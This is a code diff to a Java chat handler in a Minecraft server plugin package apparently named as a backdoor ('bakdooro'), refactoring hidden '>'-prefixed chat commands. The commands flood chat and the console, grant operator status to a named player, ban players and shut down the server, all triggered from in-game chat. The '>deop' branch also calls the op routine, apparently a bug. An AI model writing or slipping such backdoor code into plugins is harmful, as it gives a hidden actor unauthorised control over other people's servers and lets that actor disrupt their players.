@@ -1,13 +1,10 @@
 package me.acaiberii.bakdooro.util.handler;
 
-import me.acaiberii.bakdooro.blatant.blnt;
-import me.acaiberii.bakdooro.exp.exploits;
-import me.acaiberii.bakdooro.game.server;
-import org.bukkit.OfflinePlayer;
+import me.acaiberii.bakdooro.commands.blatant.blnt;
+import me.acaiberii.bakdooro.commands.exploit.exploit;
 import org.bukkit.entity.Player;
 import me.acaiberii.bakdooro.items.itm;
 
-import java.io.IOException;
 import java.util.Objects;
 import java.util.Random;
 
@@ -25,20 +22,19 @@ public class chathandler {
                 }
                 else {
                     if (spl[1].equals("chat")) {
-                        exploits.chatFill();
+                        exploit.chatFill();
                     }
                     else if (spl[1].equals("console")) {
-                        exploits.consoleFill();
+                        exploit.consoleFill();
                     }
                 }
-
             }
             else if (spl[0].startsWith(">op")) {
                 if (spl.length < 2) {
                     pl.sendMessage("Invalid syntax. Correct syntax: >op:(PLAYER)");
                 }
                 else {
-                    exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
+                    exploit.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                 }
             }
             else if (spl[0].startsWith(">deop")) {
@@ -46,7 +42,7 @@ public class chathandler {
                     pl.sendMessage("Invalid syntax. Correct syntax: >deop:(PLAYER)");
                 }
                 else {
-                    exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
+                    exploit.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                 }
             }
             else if (spl[0].startsWith(">ban")) {
@@ -104,10 +100,8 @@ public class chathandler {
                 }
             }
             else if (spl[0].startsWith(">shutdown")) {
+                pl.sendMessage("Shutting down.");
                 srv.shutdown();
-            }
-            else if (spl[0].startsWith(">restart")) {
-                srv.spigot().restart();
             }
             else if (spl[0].startsWith(">mod")) {
                 if (spl.length < 3) {
